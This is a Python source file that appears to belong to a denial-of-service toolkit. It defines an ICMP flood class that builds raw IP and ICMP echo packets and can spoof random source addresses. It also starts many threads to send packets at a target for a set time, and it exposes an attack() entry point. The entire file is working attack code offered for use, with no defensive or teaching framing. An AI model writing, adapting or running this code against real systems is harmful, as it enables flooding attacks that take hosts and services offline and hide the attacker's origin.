import socket
import struct
import random
import threading
import time
from core.ip_spoof import random_ip

class ICMPFlood:
    def __init__(self, target, port, threads, duration, spoof=False):
        self.target = target
        self.port = port
        self.threads = threads
        self.duration = duration
        self.spoof = spoof
        self.stop_event = threading.Event()

    def _checksum(self, data):
        if len(data) % 2 == 1:
            data += b'\x00'
        s = sum(struct.unpack('!%dH' % (len(data)//2), data))
        s = (s >> 16) + (s & 0xffff)
        s += s >> 16
        return ~s & 0xffff

    def _send_icmp(self):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        except Exception:
            return

        while not self.stop_event.is_set():
            src_ip = random_ip() if self.spoof else "0.0.0.0"
            # Build IP header
            ip_ihl = 5
            ip_ver = 4
            ip_tos = 0
            ip_tot_len = 20 + 8 + 64
            ip_id = random.randint(1, 65535)
            ip_frag_off = 0
            ip_ttl = 255
            ip_proto = socket.IPPROTO_ICMP
            ip_check = 0
            ip_saddr = socket.inet_aton(src_ip)
            ip_daddr = socket.inet_aton(self.target)

            ip_ihl_ver = (ip_ver << 4) + ip_ihl
            ip_header = struct.pack('!BBHHHBBH4s4s', ip_ihl_ver, ip_tos, ip_tot_len,
                                    ip_id, ip_frag_off, ip_ttl, ip_proto, ip_check,
                                    ip_saddr, ip_daddr)
            ip_check = self._checksum(ip_header)
            ip_header = struct.pack('!BBHHHBBH4s4s', ip_ihl_ver, ip_tos, ip_tot_len,
                                    ip_id, ip_frag_off, ip_ttl, ip_proto, ip_check,
                                    ip_saddr, ip_daddr)

            # ICMP echo request
            icmp_type = 8
            icmp_code = 0
            icmp_check = 0
            icmp_id = random.randint(1, 65535)
            icmp_seq = random.randint(1, 65535)
            icmp_payload = random._urandom(64)
            icmp_header = struct.pack('!BBHHH', icmp_type, icmp_code, icmp_check, icmp_id, icmp_seq)
            icmp_check = self._checksum(icmp_header + icmp_payload)
            icmp_header = struct.pack('!BBHHH', icmp_type, icmp_code, icmp_check, icmp_id, icmp_seq)

            try:
                sock.sendto(ip_header + icmp_header + icmp_payload, (self.target, 0))
            except Exception:
                pass

    def start(self):
        threads = []
        for _ in range(self.threads):
            t = threading.Thread(target=self._send_icmp)
            t.daemon = True
            t.start()
            threads.append(t)

        time.sleep(self.duration)
        self.stop_event.set()
        for t in threads:
            t.join(timeout=1)

def attack(target, port, threads, duration, spoof=False):
    flood = ICMPFlood(target, port, threads, duration, spoof)
    flood.start()
